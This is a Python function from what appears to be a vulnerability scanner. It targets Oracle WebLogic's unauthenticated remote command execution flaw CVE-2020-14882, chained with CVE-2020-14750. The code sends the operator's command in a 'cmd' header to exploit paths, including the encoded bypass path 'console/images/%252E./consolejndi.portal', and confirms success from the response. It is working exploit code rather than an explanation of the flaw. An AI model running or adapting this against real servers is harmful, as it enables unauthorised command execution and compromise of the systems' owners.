#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
import http.client

def cve_2020_14882_scan(self, url):
        ''' Weblogic 管理控制台未授权远程命令执行
                配合CVE-2020-14750未授权进入后台, 调用相关接口实现命令执行
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2020-14882'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {
            'cmd': self.cmd
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_14882_payloads:    # * Payload

            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                # * 有时候用HTTP1.1会报错, 使用HTTP1.0试试
                http.client.HTTPConnection._http_vsn = 10
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                http.client.HTTPConnection._http_vsn = 11
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'

                logger.logging(vul_info, res.status_code, res)                        # * LOG

                if (self.md in check.check_res(res.text, self.md)):
                    results = {
                        'Target': url + 'console/images/%252E./consolejndi.portal',
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Method': vul_info['vul_method'],
                        'Payload': {
                            'Url': url,
                            'Path': path,
                            'Headers': vul_info['headers']
                        },
                        'Request': res
                    }
                    return results
            except requests.ConnectTimeout:
                http.client.HTTPConnection._http_vsn = 11
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                http.client.HTTPConnection._http_vsn = 11
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
                logger.logging(vul_info, 'Faild')
                return None
            except:
                http.client.HTTPConnection._http_vsn = 11
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
                logger.logging(vul_info, 'Error')
                return None
